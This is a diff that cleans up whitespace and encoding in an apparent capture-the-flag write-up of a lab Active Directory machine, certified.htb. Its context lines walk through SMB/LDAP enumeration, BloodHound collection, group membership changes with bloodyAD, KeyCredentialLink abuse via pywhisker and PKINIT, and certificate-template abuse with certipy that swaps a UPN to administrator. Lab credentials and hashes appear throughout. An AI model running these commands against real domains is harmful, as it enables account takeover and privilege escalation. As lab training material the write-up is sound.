@@ -7,21 +7,21 @@
 ---
 
 
-| PORT | SERVICE      |
+| PORT | SERVICE |
 | :--- | :----------- |
-| 53   | domain       |
-| 88   | kerberos-sec |
-| 135  | msrpc        |
-| 139  | netbios-ssn  |
-| 389  | ldap         |
-| 445  | microsoft-ds |
-| 464  | kpasswd5     |
-| 593  | ncacn_http   |
-| 636  | ssl/ldap     |
-| 3268 | ldap         |
-| 3269 | ssl/ldap     |
-| 5985 | http         |
-| 9389 | mc-nmf       |
+| 53 | domain |
+| 88 | kerberos-sec |
+| 135 | msrpc |
+| 139 | netbios-ssn |
+| 389 | ldap |
+| 445 | microsoft-ds |
+| 464 | kpasswd5 |
+| 593 | ncacn_http |
+| 636 | ssl/ldap |
+| 3268 | ldap |
+| 3269 | ssl/ldap |
+| 5985 | http |
+| 9389 | mc-nmf |
 
 ![Pasted image 20250312100202.png](../../IMAGES/Pasted%20image%2020250312100202.png)
 
@@ -37,7 +37,7 @@ Let's start with some basic SMB enumeration:
 ```
 netexec smb 10.10.11.41
 
-SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
+SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
 ```
 
 We got the domain name: `certified.htb`, let's keep on enumerating:
@@ -46,8 +46,8 @@ We got the domain name: `certified.htb`, let's keep on enumerating:
 ```
 netexec smb 10.10.11.41 -u 'judith.mader' -p 'judith09'
 
-SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
-SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09
+SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
+SMB 10.10.11.41 445 DC01 [+] certified.htb\judith.mader:judith09
 ```
 
 The credentials we were given show that we have low-initial access to the domain, thanks to this, we can keep enumerating stuff, let's try to enumerate smb shares, but before all of this, let's add the domain controller to `/etc/hosts`:
@@ -58,27 +58,27 @@ echo '10.10.11.41 dc01.certified.htb certified.htb' | sudo tee -a /etc/hosts
 
 ```
 netexec smb 10.10.11.41 -u 'judith.mader' -p 'judith09' --shares
-SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
-SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
-SMB         10.10.11.41     445    DC01             [*] Enumerated shares
-SMB         10.10.11.41     445    DC01             Share           Permissions     Remark
-SMB         10.10.11.41     445    DC01             -----           -----------     ------
-SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin
-SMB         10.10.11.41     445    DC01             C$                              Default share
-SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC
-SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share
-SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share
+SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
+SMB 10.10.11.41 445 DC01 [+] certified.htb\judith.mader:judith09 
+SMB 10.10.11.41 445 DC01 [*] Enumerated shares
+SMB 10.10.11.41 445 DC01 Share Permissions Remark
+SMB 10.10.11.41 445 DC01 ----- ----------- ------
+SMB 10.10.11.41 445 DC01 ADMIN$ Remote Admin
+SMB 10.10.11.41 445 DC01 C$ Default share
+SMB 10.10.11.41 445 DC01 IPC$ READ Remote IPC
+SMB 10.10.11.41 445 DC01 NETLOGON READ Logon server share
+SMB 10.10.11.41 445 DC01 SYSVOL READ Logon server share
 ```
 
 Not a single interesting share, let's keep on enumerating, let's enumerate ldap with bloodhound:
 
 ```
 netexec ldap dc01.certified.htb -u judith.mader -p judith09 --bloodhound --collection All --dns-tcp --dns-server 10.10.11.41
-SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
-LDAP        10.10.11.41     389    DC01             [+] certified.htb\judith.mader:judith09 
-LDAP        10.10.11.41     389    DC01             Resolved collection methods: localadmin, group, dcom, acl, session, trusts, container, psremote, rdp, objectprops
-LDAP        10.10.11.41     389    DC01             Done in 00M 30S
-LDAP        10.10.11.41     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.10.11.41_2025-03-12_113336_bloodhound.zip
+SMB 10.10.11.41 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
+LDAP 10.10.11.41 389 DC01 [+] certified.htb\judith.mader:judith09 
+LDAP 10.10.11.41 389 DC01 Resolved collection methods: localadmin, group, dcom, acl, session, trusts, container, psremote, rdp, objectprops
+LDAP 10.10.11.41 389 DC01 Done in 00M 30S
+LDAP 10.10.11.41 389 DC01 Compressing output into /home/kali/.nxc/logs/DC01_10.10.11.41_2025-03-12_113336_bloodhound.zip
 ```
 
 Now, let's analyze the data with bloodhound:
@@ -132,7 +132,7 @@ bloodyAD --host 10.10.11.41 -d 'certified.htb' -u 'judith.mader' -p 'judith09' a
 [+] judith.mader added to Management
 ```
 
-There we go, now, we can exploit **KeyCredentialLink**, **KeyCredentialLink**Â is an attribute in Active Directory (AD) that storesÂ **public key credentials**Â linked to a user or computer account. These credentials are used for modern authentication methods likeÂ **Windows Hello for Business**Â orÂ **FIDO2 security keys**. When exploited, this attribute allows attackers toÂ **add their own malicious public key**Â to a target account, enabling authenticationÂ **without knowing the account's password**.
+There we go, now, we can exploit **KeyCredentialLink**, **KeyCredentialLink** is an attribute in Active Directory (AD) that stores **public key credentials** linked to a user or computer account. These credentials are used for modern authentication methods like **Windows Hello for Business** or **FIDO2 security keys**. When exploited, this attribute allows attackers to **add their own malicious public key** to a target account, enabling authentication **without knowing the account's password**.
 
 In order to exploit this, we can use `pywhisker`:
 
@@ -160,22 +160,22 @@ We can now obtain the TGT with the tool specified at the end of pywhisker, let's
 ```
 python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx /home/kali/pywhisker/pywhisker/GNJ5gqL7.pfx -pfx-pass VLVMMXcUZpo6JQ3sSY3C cache.ccache
 
-2025-03-12 13:18:45,538 minikerberos INFO     Loading certificate and key from file
+2025-03-12 13:18:45,538 minikerberos INFO Loading certificate and key from file
 INFO:minikerberos:Loading certificate and key from file
-2025-03-12 13:18:45,567 minikerberos INFO     Requesting TGT
+2025-03-12 13:18:45,567 minikerberos INFO Requesting TGT
 INFO:minikerberos:Requesting TGT
 Traceback (most recent call last):
-  File "/home/kali/PKINITtools/gettgtpkinit.py", line 349, in <module>
-    main()
-    ~~~~^^
-  File "/home/kali/PKINITtools/gettgtpkinit.py", line 345, in main
-    amain(args)
-    ~~~~~^^^^^^
-  File "/home/kali/PKINITtools/gettgtpkinit.py", line 315, in amain
-    res = sock.sendrecv(req)
-  File "/home/kali/pywhisker/myenv/lib/python3.13/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
-    raise KerberosError(krb_message)
-minikerberos.protocol.errors.KerberosError:  Error Name: KRB_AP_ERR_SKEW Detail: "The clock skew is too great"
+ File "/home/kali/PKINITtools/gettgtpkinit.py", line 349, in <module>
+ main()
+ ~~~~^^
+ File "/home/kali/PKINITtools/gettgtpkinit.py", line 345, in main
+ amain(args)
+ ~~~~~^^^^^^
+ File "/home/kali/PKINITtools/gettgtpkinit.py", line 315, in amain
+ res = sock.sendrecv(req)
+ File "/home/kali/pywhisker/myenv/lib/python3.13/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
+ raise KerberosError(krb_message)
+minikerberos.protocol.errors.KerberosError: Error Name: KRB_AP_ERR_SKEW Detail: "The clock skew is too great"
 ```
 
 Got an error, this occurs due to the clock time of our machine being out of sync with the domain controller, let's fix it:
@@ -190,15 +190,15 @@ Now, let's try again:
 
 ```
 python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx /home/kali/pywhisker/pywhisker/GNJ5gqL7.pfx -pfx-pass VLVMMXcUZpo6JQ3sSY3C cache.ccache
-2025-03-12 20:28:18,490 minikerberos INFO     Loading certificate and key from file
+2025-03-12 20:28:18,490 minikerberos INFO Loading certificate and key from file
 INFO:minikerberos:Loading certificate and key from file
-2025-03-12 20:28:18,515 minikerberos INFO     Requesting TGT
+2025-03-12 20:28:18,515 minikerberos INFO Requesting TGT
 INFO:minikerberos:Requesting TGT
-2025-03-12 20:28:40,123 minikerberos INFO     AS-REP encryption key (you might need this later):
+2025-03-12 20:28:40,123 minikerberos INFO AS-REP encryption key (you might need this later):
 INFO:minikerberos:AS-REP encryption key (you might need this later):
-2025-03-12 20:28:40,123 minikerberos INFO     e0da658aa6af3696f137ffd2c81f0daf1c585c4c692f7418affa0e9fde5e381f
+2025-03-12 20:28:40,123 minikerberos INFO e0da658aa6af3696f137ffd2c81f0daf1c585c4c692f7418affa0e9fde5e381f
 INFO:minikerberos:e0da658aa6af3696f137ffd2c81f0daf1c585c4c692f7418affa0e9fde5e381f
-2025-03-12 20:28:40,125 minikerberos INFO     Saved TGT to file
+2025-03-12 20:28:40,125 minikerberos INFO Saved TGT to file
 INFO:minikerberos:Saved TGT to file
 ```
 
@@ -236,7 +236,7 @@ There we go, we got our ticket, with this, we could go inside Winrm and get our 
 ---
 
 
-From what we found at the reconnaissance stage, we discovered that `management_svc` has `GenericAll` permission over `ca_operator` account, **GenericAll**Â is a powerful permission in Active Directory (AD) that grantsÂ **full control**Â over a target object (e.g., a user, group, computer, or organizational unit). If a user or group has theÂ `GenericAll`Â privilege over another object, they can performÂ **any action**Â on that object, including modifying its attributes, resetting passwords, deleting it, or adding/removing members (for groups).
+From what we found at the reconnaissance stage, we discovered that `management_svc` has `GenericAll` permission over `ca_operator` account, **GenericAll** is a powerful permission in Active Directory (AD) that grants **full control** over a target object (e.g., a user, group, computer, or organizational unit). If a user or group has the`GenericAll` privilege over another object, they can perform **any action** on that object, including modifying its attributes, resetting passwords, deleting it, or adding/removing members (for groups).
 
 So, let's break down our privilege escalation, we can work our way into admin in the following way:
 
@@ -255,7 +255,7 @@ We can check our key terms:
 ### **Key Terms & Techniques**
 
 1. **GenericAll Rights**:
-    - A permission granting full control over an AD object (e.g., user, group).
+ - A permission granting full control over an AD object (e.g., user, group).
 
 2. **KeyCredentialLink**:
 
@@ -263,7 +263,7 @@ We can check our key terms:
 
 3. **UserPrincipalName (UPN)**:
 
-- An identifier formatted asÂ `user@domain`Â (e.g.,Â `administrator@certified.htb`).
+- An identifier formatted as`user@domain` (e.g.,`administrator@certified.htb`).
 
 4. **Certificate Template Misconfiguration**:
 
@@ -304,10 +304,10 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 There we go, our next step is **Updating the UPN of `ca_operator` to `administrator`**:
 
 ```
-certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operatorÂ  -upn administrator
+certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator
 
 [*] Updating user 'ca_operator':
-    userPrincipalName                   : administrator
+ userPrincipalName : administrator
 [*] Successfully updated 'ca_operator'
 ```
 
@@ -333,11 +333,11 @@ certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f7
 Nice, now, let's **restore the `ca_operator` UPN to its original value**:
 
 ```
-certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operatorÂ  -upn ca_operator@certified.htb
+certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
 
 
 [*] Updating user 'ca_operator':
-    userPrincipalName                   : ca_operator@certified.htb
+ userPrincipalName : ca_operator@certified.htb
 [*] Successfully updated 'ca_operator
 ```
 
